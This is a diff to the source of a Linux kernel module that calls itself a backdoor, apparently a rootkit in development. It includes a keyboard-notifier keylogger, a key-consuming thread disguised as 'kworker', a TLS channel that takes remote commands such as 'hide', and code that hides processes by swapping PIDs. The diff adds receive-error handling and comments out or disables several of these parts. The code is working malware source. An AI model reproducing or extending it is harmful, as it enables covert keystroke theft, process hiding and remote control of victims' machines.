@@ -313,6 +313,17 @@ int read_TLS(void) {
         tmp_port = 0;
         memset(buffer, 0, MAX_PAYLOAD);
         len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
+        if (len < 0) {
+            if (len == -EAGAIN) {
+                continue;
+            } else {
+                printk(KERN_INFO "Received error message on read %d\n", len);
+                break;
+            }
+        }
+        if (len == 0) {
+            continue;
+        }
         printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
         if (len < 5) {
             strcpy(buffer, bad_len);
@@ -356,6 +367,7 @@ int read_TLS(void) {
                 hide();
             }
         } else if (memcmp("hide", buffer, 4) == 0) {
+#if 0
             if (kstrtou16(buffer + 5, 10, &tmp_port)) {
                 strcpy(buffer, bad_port);
                 send_msg(svc->tls_socket, buffer, strlen(bad_port));
@@ -380,6 +392,7 @@ int read_TLS(void) {
                     write_unlock(my_tasklist_lock);
                 }
             }
+#endif
         } else {
             strcpy(buffer, unknown);
             send_msg(svc->tls_socket, buffer, strlen(unknown));
@@ -420,6 +433,14 @@ int init_userspace_conn(void) {
         printk(KERN_ERR "cannot connect on tls socket, error code: %d\n", error);
         return error;
     }
+
+#if 0
+    error = kernel_setsockopt(svc->tls_socket, SOL_SOCKET, SOCK_NONBLOCK, &(int){1}, sizeof(int))
+    if (error < 0) {
+        printk(KERN_ERR "Cannot set socket to nonblocking: %d\n", error);
+        return error;
+    }
+#endif
 
     return 0;
 }
@@ -579,7 +600,7 @@ void my_custom_cleanup(void) {
     nf_unregister_net_hook(&init_net, &nfhi);
 
     unregister_keyboard_notifier(&keysniffer_blk);
-    unregister_reboot_notifier(&reboot_blk);
+    //unregister_reboot_notifier(&reboot_blk);
 
     if (svc) {
         if (svc->tls_socket) {
@@ -599,6 +620,7 @@ void my_custom_cleanup(void) {
         kfree(closed_ports);
     }
 
+#if 0
     write_lock(my_tasklist_lock);
     for (i = 0; i < hidden_count; ++i) {
         change_pidR(hidden_procs[i].ts, PIDTYPE_PID, hidden_procs[i].p);
@@ -607,6 +629,7 @@ void my_custom_cleanup(void) {
         force_sig(SIGKILL, hidden_procs[i].ts);
     }
     write_unlock(my_tasklist_lock);
+#endif
 }
 
 //Kills the kernel module indirectly on reboot
@@ -680,9 +703,9 @@ static int __init mod_init(void) {
     printk(KERN_ALERT "backdoor module loaded\n");
 
     register_keyboard_notifier(&keysniffer_blk);
-    register_reboot_notifier(&reboot_blk);
+    //register_reboot_notifier(&reboot_blk);
 
-    kthread_run((void*) consume_keys, NULL, "kworker");
+    //kthread_run((void*) consume_keys, NULL, "kworker");
 
     //const char *foobar = "foobar";
     //send_msg(svc->tls_socket, foobar, strlen(foobar));
